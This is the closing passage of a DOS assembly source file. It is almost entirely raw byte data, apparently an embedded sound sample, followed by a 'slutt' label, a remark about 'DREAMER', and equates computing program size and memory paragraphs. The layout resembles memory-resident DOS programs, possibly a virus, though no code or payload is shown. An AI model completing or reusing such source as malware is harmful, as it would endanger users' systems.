        db 0C7h,0DCh,02Eh,08Fh,094h,020h,02Ah,07Dh,06Eh,0BDh,0ACh,06Ch,04Ch
        db 0A3h,0FFh,080h,03Eh,0B3h,030h,02Ah,04Dh,08Eh,04Dh,095h,0A3h,06Ch
        db 057h,0AFh,0FFh,060h,05Bh,0D5h,032h,04Fh,06Fh,064h,05Eh,0CDh,0A0h
        db 03Ah,06Fh,0CDh,0C0h,04Ah,082h,0DBh,02Ch,06Dh,04Bh,04Eh,087h,0B8h
        db 06Bh,058h,07Fh,09Eh,0CCh,072h,073h,0D5h,030h,06Fh,067h,048h,05Bh
        db 0BAh,09Ch,058h,07Dh,099h,0D4h,094h,06Ch,0C3h,04Ch,079h,03Eh,025h
        db 06Bh,0D4h,078h,072h,07Bh,07Ah,0BBh,0C1h,04Ah,08Bh,088h,02Bh,058h
        db 034h,046h,0DDh,09Ah,080h,072h,06Ch,08Fh,0FFh,070h,013h,0B1h,030h
        db 086h,055h,05Fh,0C7h,0B4h,082h,075h,087h,08Dh,0FFh,078h,000h,0A7h
        db 058h,07Bh,070h,03Ah,05Bh,0BCh,08Eh,0A8h,0ACh,034h,08Fh,0D8h,028h
        db 05Bh,0E0h,028h,07Fh,059h,029h,0ABh,0CCh,064h,06Bh,080h,049h,0AFh
        db 0D0h,023h,07Fh,0B0h,00Eh,089h,061h,02Fh,0B7h,0B2h,070h,092h,088h
        db 06Fh,0EFh,090h,023h,09Bh,0B4h,035h,08Ch,03Dh,03Fh,0D3h,094h,08Bh
        db 0C7h,060h,03Bh,0B9h,082h,069h,0CFh,0A0h,027h,084h,02Ah,04Bh,0EFh
        db 08Ch,07Eh,08Ch,050h,05Fh,0E3h,079h,04Fh,0AFh,078h,01Bh,081h,02Ch
        db 03Dh,0D3h,078h,077h,0B3h,066h,055h,0BFh,082h,069h,0B2h,0A8h,025h
        db 08Ah,035h,043h,0D3h,09Ch,07Bh,09Bh,05Ah,03Dh,0AFh,0C6h,07Fh,077h
        db 07Fh,062h,06Ah,096h,05Dh,073h,0AAh,06Ah,08Ch,08Ah,054h,04Fh,08Eh
        db 0AAh,07Bh,06Fh,09Ch,070h,05Dh,084h,056h,07Fh,0C5h,085h,073h,060h
        db 05Ah,071h,0C3h,0A8h,050h,056h,064h,071h,087h,0ACh,04Bh,071h,088h
        db 074h,0A4h,08Bh,085h,069h,072h,0A9h,090h,067h,07Ch,0A8h,038h,07Fh
        db 088h,05Bh,07Fh,0A5h,06Ah,073h,0B9h,05Bh,056h,0B2h,05Ah,042h,0A2h
        db 0CCh,044h,037h,079h,055h,073h,0E2h,0A5h,06Bh,091h,062h,056h,0B7h
        db 0ACh,051h,05Fh,0A1h,090h,02Eh,0A3h,07Eh,045h,09Fh,0A2h,07Ch,095h
        db 08Ah,070h,067h,0AEh,074h,055h,0A7h,0DBh,018h,033h,066h,06Ch,07Bh
        db 0C3h,090h,049h,07Dh,093h,076h,0B3h,0B0h,041h,046h,0A3h,08Dh,02Ah
        db 08Fh,075h,046h,087h,0B2h,07Bh,07Eh,091h,06Eh,071h,09Fh,08Ah,069h
        db 070h,092h,08Ah,04Fh,096h,090h,056h,07Dh,090h,084h,07Dh,0A1h,086h
        db 066h,084h,08Bh,073h,081h,080h,084h,072h,089h,082h,06Bh,06Eh,07Fh
        db 080h,077h,079h,095h,091h,059h,059h,081h,070h,069h,08Bh,08Eh,088h
        db 059h,07Ch,06Dh,097h,083h,06Eh,07Fh,087h,093h,087h,078h,05Ch,078h
        db 098h,07Eh,077h,08Fh,097h,062h,067h,080h,066h,07Eh,0A1h,07Ah,07Dh
        db 089h,095h,078h,055h,073h,092h,08Ch,077h,07Dh,096h,092h,04Ah,05Fh
        db 06Eh,087h,092h,08Ch,082h,085h,092h,078h,058h,06Ch,092h,073h,073h
        db 086h,08Eh,07Fh,05Eh,04Ah,06Ch,073h,092h,0A0h,07Eh,090h,097h,08Bh
        db 073h,070h,078h,089h,089h,075h,079h,08Fh,08Eh,07Ah,040h,05Fh,07Ch
        db 086h,085h,0A2h,0A9h,084h,07Fh,075h,05Ch,073h,09Ch,076h,061h,07Fh
        db 079h,075h,092h,082h,031h,069h,086h,076h,09Fh,0B1h,07Eh,073h,092h
        db 06Bh,067h,097h,087h,074h,078h,07Ah,085h,099h,065h,067h,088h,054h
        db 069h,085h,084h,087h,0A3h,08Ch,078h,09Fh,086h,053h,067h,07Ch,068h
        db 075h,092h,078h,072h,07Ch,062h,07Dh,0AFh,090h,06Bh,07Ch,06Eh,068h
        db 08Fh,0A0h,078h,06Ah,072h,075h,08Dh,08Ch,07Eh,089h,072h,054h,072h
        db 08Bh,089h,07Fh,072h,06Bh,08Ah,0A2h,089h,08Fh,085h,066h,071h,093h
        db 088h,074h,078h,06Dh,070h,08Ah,088h,089h,08Dh,072h,06Bh,080h,078h
        db 079h,070h,069h,06Ch,07Ch,08Bh,082h,08Bh,078h,06Ah,087h,081h,07Eh
        db 08Eh,070h,05Fh,079h,085h,07Fh,087h,07Ah,05Fh,08Ah,0A4h,076h,079h
        db 080h,06Ah,069h,075h,07Eh,093h,0A5h,081h,072h,088h,088h,085h,090h
        db 078h,060h,071h,07Bh,07Fh,084h,07Ah,068h,07Ah,08Ch,07Fh,07Ah,070h
        db 068h,076h,07Ch,077h,093h,0A2h,080h,086h,07Dh,07Bh,083h,08Eh,068h
        db 064h,074h,06Eh,077h,097h,074h,068h,080h,080h,071h,08Bh,07Ch,059h
        db 079h,08Ah,074h,099h,09Ch,066h,07Fh,0A6h,07Fh,08Fh,0A0h,056h,06Dh
        db 0A2h,06Ch,07Dh,09Dh,060h,05Fh,098h,072h,063h,097h,088h,048h,07Dh
        db 085h,069h,0A3h,088h,04Eh,063h,09Fh,091h,077h,08Ch,074h,042h,085h
        db 09Ch,06Ch,095h,066h,051h,08Fh,0CFh,07Ah,073h,09Ah,080h,065h,097h
        db 080h,05Ah,081h,04Ch,04Ah,09Eh,09Ch,074h,07Fh,083h,086h,097h,09Ah
        db 069h,07Fh,08Ch,060h,06Fh,0A0h,077h,06Eh,08Ch,08Eh,07Dh,083h,083h
        db 064h,07Ah,074h,05Eh,079h,09Fh,07Ah,063h,083h,092h,069h,091h,088h
        db 052h,075h,070h,069h,08Fh,0A0h,06Bh,074h,0ABh,08Eh,062h,08Dh,066h
        db 063h,08Ah,071h,07Bh,0BBh,098h,068h,087h,0A4h,077h,097h,08Ch,044h
        db 056h,069h,071h,0A7h,094h,05Dh,05Eh,0A4h,07Ch,077h,08Eh,05Ch,04Dh
        db 07Eh,074h,07Bh,0ACh,078h,059h,0A3h,0A4h,060h,082h,084h,049h,075h
        db 081h,07Eh,0ADh,0A5h,071h,07Fh,0BAh,074h,071h,084h,04Ah,05Bh,073h
        db 071h,087h,0ADh,07Ch,062h,0ADh,093h,073h,097h,06Ah,03Fh,070h,077h
        db 07Bh,0B5h,088h,058h,08Bh,0A8h,061h,079h,080h,045h,06Eh,075h,071h
        db 09Bh,0B2h,072h,06Bh,0B0h,080h,078h,096h,061h,042h,05Fh,073h,08Dh
        db 0B4h,088h,068h,0A3h,096h,06Fh,08Dh,07Ch,04Ah,05Eh,06Ch,07Fh,0BBh
        db 0A0h,070h,08Fh,0B0h,07Eh,07Fh,08Ah,040h,030h,063h,086h,0AFh,0ACh
        db 066h,063h,0B3h,080h,07Ch,07Eh,04Ch,03Fh,059h,079h,096h,09Bh,084h
        db 077h,0ADh,090h,071h,085h,080h,03Eh,041h,073h,093h,0D3h,0B2h,076h
        db 091h,09Ah,083h,0A3h,090h,040h,038h,05Bh,08Ah,0A7h,088h,071h,086h
        db 090h,06Bh,07Eh,083h,052h,043h,057h,08Bh,0BBh,0C0h,080h,07Fh,0AAh
        db 068h,07Bh,094h,050h,030h,048h,076h,09Dh,0A6h,07Dh,072h,0A7h,07Ah
        db 069h,07Ah,07Dh,054h,065h,06Ch,085h,0A9h,0AAh,095h,0B2h,09Ch,059h
        db 089h,0A1h,04Ch,049h,060h,07Eh,0C3h,0C0h,080h,083h,0A9h,067h,07Bh
        db 08Dh,060h,03Ch,05Ah,085h,081h,07Eh,079h,08Dh,0B3h,060h,05Bh,07Bh
        db 064h,03Dh,053h,06Ch,093h,0B5h,090h,08Ah,0BBh,07Ah,06Fh,08Fh,076h
        db 046h,05Fh,070h,087h,0B3h,08Ch,07Ch,0AEh,078h,059h,085h,07Eh,048h
        db 050h,07Bh,09Dh,0C1h,0A1h,08Fh,09Fh,098h,073h,085h,07Ch,048h,055h
        db 07Ah,083h,083h,08Bh,08Bh,0A0h,0A8h,068h,06Fh,087h,05Eh,04Ah,061h
        db 083h,095h,0A1h,090h,08Fh,0A8h,068h,067h,07Fh,062h,03Ah,056h,06Eh
        db 097h,0B3h,087h,076h,09Fh,096h,06Ah,083h,080h,043h,056h,07Eh,088h
        db 087h,08Fh,090h,0ADh,0B4h,060h,066h,08Dh,06Dh,044h,05Ch,075h,096h
        db 0CAh,08Ch,063h,098h,071h,079h,087h,078h,044h,04Bh,083h,097h,09Bh
        db 08Ah,07Ch,09Eh,0ACh,061h,05Fh,07Fh,062h,04Ah,067h,08Ah,095h,0BBh
        db 098h,08Ch,0BDh,084h,085h,091h,06Ch,045h,059h,085h,08Bh,095h,08Bh
        db 083h,0A4h,08Ch,04Dh,06Ah,08Bh,060h,048h,05Eh,07Fh,0ADh,0CCh,07Ch
        db 068h,09Ch,064h,083h,089h,054h,036h,04Fh,07Dh,096h,0AFh,088h,072h
        db 086h,0A0h,08Bh,074h,05Bh,04Dh,073h,078h,087h,09Eh,09Dh,092h,0A5h
        db 0BCh,076h,07Bh,085h,059h,055h,06Ch,081h,093h,0A7h,0A1h,07Bh,07Ch
        db 084h,06Dh,07Ch,07Bh,042h,039h,057h,07Dh,0C5h,0ACh,05Ah,071h,092h
        db 06Ah,08Ah,09Fh,061h,046h,06Eh,099h,0BBh,0ABh,076h,073h,0A4h,068h
        db 069h,06Fh,061h,036h,04Dh,07Bh,09Fh,0D1h,0A2h,081h,0B2h,098h,07Eh
        db 093h,086h,04Bh,04Dh,077h,08Dh,0A7h,092h,07Ah,09Dh,0A0h,057h,072h
        db 07Ah,05Ch,063h,065h,06Fh,09Fh,0CDh,08Dh,074h,09Ch,060h,063h,089h
        db 070h,035h,046h,070h,095h,0C6h,090h,061h,085h,094h,06Ah,07Fh,07Eh
        db 04Ah,05Ch,066h,076h,0A5h,0BAh,090h,087h,0BAh,082h,07Eh,095h,086h
        db 04Ch,054h,07Dh,09Eh,0C9h,0A0h,06Ch,093h,086h,065h,073h,078h,03Dh
        db 058h,065h,06Fh,08Ah,0AAh,090h,094h,0A1h,055h,062h,08Bh,068h,03Eh
        db 04Ch,06Ch,09Bh,0D8h,090h,06Eh,0ACh,086h,07Dh,092h,076h,044h,052h
        db 073h,089h,0B9h,096h,06Eh,08Dh,0A2h,065h,06Dh,084h,04Ah,05Dh,079h
        db 090h,085h,094h,0ADh,0BBh,0C4h,066h,062h,083h,08Eh,056h,054h,068h
        db 07Bh,0BFh,0BCh,070h,082h,063h,06Eh,08Dh,085h,040h,04Ah,069h,085h
        db 0BDh,090h,05Ch,075h,09Ah,073h,07Bh,088h,050h,053h,074h,087h,097h
        db 0ADh,08Eh,085h,0B3h,080h,073h,07Bh,076h,048h,059h,098h,092h,088h
        db 08Ch,099h,0B6h,0A8h,05Bh,064h,081h,05Ch,050h,058h,066h,085h,0BFh
        db 0A6h,072h,082h,057h,077h,0A5h,07Ch,04Dh,062h,07Bh,092h,0CAh,088h
        db 054h,095h,080h,069h,07Bh,080h,04Ch,059h,07Ah,092h,0B5h,0B0h,079h
        db 08Dh,09Ah,07Fh,07Fh,084h,057h,056h,076h,091h,09Fh,0A2h,088h,08Ah
        db 0A5h,06Ah,06Dh,075h,05Ch,049h,062h,079h,087h,0BEh,099h,066h,08Eh
        db 076h,07Eh,08Bh,074h,04Dh,05Bh,077h,089h,0AFh,0A0h,061h,07Bh,082h
        db 065h,077h,08Eh,068h,068h,073h,08Eh,0A6h,0CAh,08Dh,065h,087h,08Bh
        db 084h,076h,07Ch,054h,063h,075h,08Ah,0ADh,0B5h,078h,077h,093h,06Fh
        db 07Bh,086h,060h,05Dh,068h,07Ah,093h,0C5h,08Ch,055h,083h,069h,071h
        db 076h,072h,056h,05Ch,06Bh,081h,0ADh,0C4h,080h,067h,07Ah,061h,077h
        db 096h,07Ah,072h,06Dh,07Eh,095h,0C2h,0B8h,064h,06Fh,072h,069h,078h
        db 09Ah,078h,06Eh,073h,087h,0A7h,0CEh,098h,050h,07Eh,073h,074h,07Dh
        db 088h,062h,066h,07Fh,091h,09Fh,0C3h,080h,058h,07Eh,060h,065h,081h
        db 078h,057h,05Fh,088h,08Ch,0A0h,0B5h,076h,057h,070h,058h,070h,094h
        db 075h,05Ch,077h,09Ch,08Ah,0A3h,0B8h,068h,05Fh,08Ch,06Dh,06Ah,095h
        db 07Bh,06Bh,085h,093h,08Ah,0AFh,0B0h,064h,05Fh,08Fh,063h,069h,08Fh
        db 067h,063h,07Dh,08Ah,082h,0A9h,0A8h,05Eh,05Dh,08Ah,060h,06Ah,089h
        db 074h,073h,07Fh,092h,07Ch,089h,0B3h,081h,05Fh,093h,072h,066h,07Ah
        db 08Eh,07Eh,089h,094h,080h,07Eh,09Fh,098h,064h,088h,              
slutt:               ; DREAMER has a weird sense of humor

size    equ $-100h
pgf     equ ($+16)/16
